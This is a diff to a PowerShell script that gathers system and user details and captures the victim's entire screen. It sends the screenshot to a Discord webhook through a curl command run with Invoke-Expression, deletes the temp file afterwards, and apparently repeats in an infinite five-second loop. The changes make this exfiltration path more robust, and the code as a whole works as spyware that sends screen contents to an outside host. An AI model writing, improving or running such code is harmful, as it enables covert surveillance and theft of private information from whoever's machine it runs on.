@@ -2,7 +2,7 @@
 $webhookURL = $dc  # $webhookURL is the variable passed via the command line
 
 # Define the path to the temp log file
-$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
+$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log2.txt')
 
 # Set the default expiry date to 30 days from today if no expiry date is passed
 if (-not $expiryDateParam) {
@@ -68,13 +68,13 @@ $cpuInfo = Get-WmiObject -Class Win32_Processor
 $userInfo = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $hostname = $env:COMPUTERNAME
 
+# Load necessary assemblies
+Add-Type -AssemblyName "System.Windows.Forms"
+Add-Type -AssemblyName "System.Drawing"
+
 # Function to take screenshot and send it to Discord
 function Send-ScreenshotToWebhook {
-    # Load necessary assemblies
-    Add-Type -AssemblyName "System.Windows.Forms"
-    Add-Type -AssemblyName "System.Drawing"
-
-    # Accessing the VirtualScreen property
+    # Accessing the VirtualScreen property (handles multi-monitor setups)
     $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
     $Width = $Screen.Width
     $Height = $Screen.Height
@@ -86,29 +86,25 @@ function Send-ScreenshotToWebhook {
     $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 
-    # Convert the bitmap to a memory stream to send as a file
-    $memoryStream = New-Object System.IO.MemoryStream
-    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
-    $memoryStream.Seek(0, [System.IO.SeekOrigin]::Begin)  # Reset stream position to the beginning
+    # Save the screenshot to a temporary file
+    $Filett = "$env:temp\SC.png"
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::Png)
 
-    # Create multipart form data for the POST request
-    $formData = @{
-        file1 = New-Object System.Net.Http.MultipartFormDataContent
-    }
-
-    $fileContent = New-Object System.Net.Http.ByteArrayContent($memoryStream.ToArray())
-    $fileContent.Headers.ContentType = "image/png"
-    $formData['file1'] = $fileContent
-
-    # Send to Discord webhook
+    # Send the screenshot to Discord using curl
     try {
-        $response = Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType 'multipart/form-data' -Body $formData
+        # Send file using curl
+        $curlCommand = "curl.exe -F ""file=@$Filett"" $webhookURL"
+        Invoke-Expression $curlCommand
+
         Write-Host "Screenshot sent successfully!" -ForegroundColor Green
     }
     catch {
         Write-Host "Error while sending screenshot:" -ForegroundColor Red
         Write-Host $_.Exception.Message
     }
+
+    # Clean up by deleting the screenshot file
+    Remove-Item -Path $Filett -Force
 }
 
 # Start an infinite loop to check the file every 5 seconds
